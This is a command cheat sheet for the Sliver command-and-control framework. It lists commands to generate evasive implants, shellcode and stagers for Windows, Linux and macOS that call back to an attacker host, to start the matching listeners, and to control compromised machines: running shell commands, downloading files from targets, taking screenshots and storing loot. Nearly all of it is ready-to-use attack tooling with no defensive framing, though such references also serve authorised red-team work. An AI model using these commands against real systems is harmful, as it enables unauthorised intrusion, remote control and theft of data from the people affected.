# Sliver C2

% sliver

#plateform/linux #target/remote #cat/C2 #tag/command-control

## Start Sliver Server
#cat/SETUP 
```
sliver server
```

## Start Sliver Client
#cat/SETUP 
```
sliver client
```

## List Active Listeners
#cat/UTILS 
```
jobs
```

## Generate Windows EXE with mTLS
#cat/PAYLOAD 
```
generate --mtls <lhost>
```

## Generate Windows EXE with HTTP
#cat/PAYLOAD 
```
generate --http <lhost>:<lport>
```

## Generate Windows EXE with HTTPS
#cat/PAYLOAD 
```
generate --https <lhost>:<lport>
```

## Generate Windows EXE with DNS
#cat/PAYLOAD 
```
generate --dns <lhost>
```

## Generate Windows EXE with WireGuard
#cat/PAYLOAD 
```
generate --wg <lhost>:<lport> --key-exchange <lport> --tcp-comms <lport>
```

## Generate Windows EXE with Named Pipe
#cat/PAYLOAD 
```
generate --named-pipe <pipe_name>
```

## Generate Windows EXE with TCP Pivot
#cat/PAYLOAD 
```
generate --tcp-pivot <lhost>:<lport>
```

## Generate Windows DLL with mTLS
#cat/PAYLOAD 
```
generate --format shared --mtls <lhost>
```

## Generate Windows Shellcode with mTLS
#cat/PAYLOAD 
```
generate --format shellcode --mtls <lhost>
```

## Generate Linux ELF with mTLS
#cat/PAYLOAD 
```
generate --os linux --mtls <lhost>
```

## Generate Linux ELF with HTTP
#cat/PAYLOAD 
```
generate --os linux --http <lhost>:<lport>
```

## Generate MacOS Mach-O with mTLS
#cat/PAYLOAD 
```
generate --os mac --mtls <lhost>
```

## Generate MacOS Mach-O with HTTP
#cat/PAYLOAD 
```
generate --os mac --http <lhost>:<lport>
```

## Generate with Multiple C2 Protocols
#cat/PAYLOAD 
```
generate --os linux --mtls <lhost>,<lhost2> --http <lhost>:<lport>,<lhost2>:<lport> --dns <lhost>
```

## Generate with DNS Canary
#cat/PAYLOAD 
```
generate --mtls <lhost> --canary <canary_domain>
```

## Generate with Execution Limits
#cat/PAYLOAD 
```
generate --mtls <lhost> --limit-hostname <hostname> --limit-username <user> --limit-domainjoined
```

## Generate with Evasion Features
#cat/PAYLOAD 
```
generate --mtls <lhost> --evasion
```

## Generate with Debug Features
#cat/PAYLOAD 
```
generate --mtls <lhost> --debug
```

## Generate Beacon Binary
#cat/PAYLOAD 
```
generate beacon --mtls <lhost>
```

## Generate Stager with Metasploit
#cat/PAYLOAD 
```
generate stager --mtls <lhost>
```

## Start mTLS Listener
#cat/LISTENER 
```
mtls --lhost <lhost> --lport <lport>
```

## Start HTTP Listener
#cat/LISTENER 
```
http --lhost <lhost> --lport <lport>
```

## Start HTTPS Listener
#cat/LISTENER 
```
https --lhost <lhost> --lport <lport>
```

## Start DNS Listener
#cat/LISTENER 
```
dns --lhost <lhost> --lport <lport>
```

## Start WireGuard Listener
#cat/LISTENER 
```
wg --lhost <lhost> --lport <lport>
```

## Start Stage Listener
#cat/LISTENER 
```
stage-listener --lhost <lhost> --lport <lport>
```

## List Available Profiles
#cat/UTILS 
```
profiles
```

## Show Generate Help
#cat/UTILS 
```
help generate
```

## Show Available Commands
#cat/UTILS 
```
help
```

## List Implants
#cat/UTILS 
```
implants
```

## List Sessions
#cat/UTILS 
```
sessions
```

## List Beacons
#cat/UTILS 
```
beacons
```

## Use Session
#cat/COMMAND 
```
use <session_id>
```

## Background Session
#cat/COMMAND 
```
background
```

## Execute Command on Session
#cat/COMMAND 
```
execute <command>
```

## Shell Command on Session
#cat/COMMAND 
```
shell <command>
```

## Download File from Target
#cat/COMMAND 
```
download <remote_file>
```

## Upload File to Target
#cat/COMMAND 
```
upload <local_file> <remote_path>
```

## Screenshot Target
#cat/COMMAND 
```
screenshot
```

## Get Process List
#cat/COMMAND 
```
ps
```

## Get System Info
#cat/COMMAND 
```
info
```

## List Directory Contents
#cat/COMMAND 
```
ls <path>
```

## Change Directory
#cat/COMMAND 
```
cd <path>
```

## Get Current Working Directory
#cat/COMMAND 
```
pwd
```

## Manage Loot Store
#cat/UTILS 
```
loot
```

## List Canaries
#cat/UTILS 
```
canaries
```

## Monitor Threat Intel
#cat/UTILS 
```
monitor
```

## Generate WireGuard Config
#cat/UTILS 
```
wg-config
```

## List WireGuard Port Forwards
#cat/UTILS 
```
wg-portfwd
```

## List WireGuard SOCKS Servers
#cat/UTILS 
```
wg-socks
```

## Manage Websites (HTTP C2)
#cat/UTILS 
```
websites
```

## Manage Tasks (Beacon)
#cat/UTILS 
```
tasks
```

## Manage Hosts Database
#cat/UTILS 
```
hosts
```

## Manage Environment Variables
#cat/UTILS 
```
env
```

## Manage Settings
#cat/UTILS 
```
settings
```

## Manage Reactions
#cat/UTILS 
```
reaction
```

## Regenerate Implant
#cat/UTILS 
```
regenerate
```

## List External Builders
#cat/UTILS 
```
builders
```

## Manage Aliases
#cat/UTILS 
```
aliases
```

## Armory (Extensions)
#cat/UTILS 
```
armory
```

## Cursed (Chrome/Electron)
#cat/UTILS 
```
cursed
```

## Manage Operators
#cat/UTILS 
```
operators
```

## Check for Updates
#cat/UTILS 
```
update
```

## Display Version
#cat/UTILS 
```
version
```

## Clear Screen
#cat/UTILS 
```
clear
```

## Exit Sliver
#cat/UTILS 
```
exit
```
